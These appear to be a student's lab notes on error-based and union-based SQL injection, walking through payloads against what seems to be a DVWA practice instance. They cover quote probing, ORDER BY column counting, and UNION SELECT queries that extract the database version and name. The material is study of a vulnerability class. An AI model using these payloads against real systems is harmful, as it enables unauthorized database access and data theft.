# Types of SQL Injection

put images

# In-Band SQL Injection

1. In-band SQLi occurs when the attacker uses the same communication channel to both launch the attack and gather the result of the attack
   - Retrieved data is presented directly in the application web page
2. Easier to exploit than other categories of SQLi
3. Two common types of in-band SQLi
   - Error-based SQLi
   - Union-based SQLi
  
     
# Eror based injection:
+ Error (we need error output)

### [UNION] Three basic rules of injecting
1. Balance
2. Inject
3. Commenting


=========================================================================================================================
### Refine krun tak


Error based injection:
[1] Error

[UNION] Three basic rules of injecting

[1]. Balance.
[2]. Inject.
[3]. Commenting.








[+] ERROR:
```

http://20.251.155.53:8080/vulnerabilities/sqli/?id=2&Submit=Submit#

```
Param: id

payload: char, -int, ', "

```
http://20.251.155.53:8080/vulnerabilities/sqli/?id=2'&Submit=Submit#

```

DB: MariaDB

Placement: "2'"


-------------------

select ??? from ??? where ??="INPUT";

Table: ?

Columns: ?

DB name: ?

-------------------

```
http://20.251.155.53:8080/vulnerabilities/sqli/?id=2' order by 1,2 -- -&Submit=Submit#

```
Param: id

Payload: 2' order by 1,2 -- -

No. of Columns: 2

<img width="1246" height="299" alt="image" src="https://github.com/user-attachments/assets/891b4d98-d745-42a1-8cf8-1b7128a69b9e" />

it give error
----------------------

Union Injection:

```
http://20.251.155.53:8080/vulnerabilities/sqli/?id=2' union select 1,2 -- -&Submit=Submit#
```
Param: id

Payload: 2' union select 1,2 -- -

No. of Columns: 2

<img width="932" height="317" alt="image" src="https://github.com/user-attachments/assets/d3ef5ce9-715d-498b-abd7-5f894f89697d" />

with this command it shows the data of data base and our input also

_____________

```

http://20.251.155.53:8080/vulnerabilities/sqli/?id=2' union select version(),database() -- -&Submit=Submit#

```
Param: id

Payload: 2' union select version(),database() -- -

No. of Columns: 2

<img width="1121" height="291" alt="image" src="https://github.com/user-attachments/assets/6e4005d8-032f-46db-8d8f-1fb93d731d3d" />

-------------------

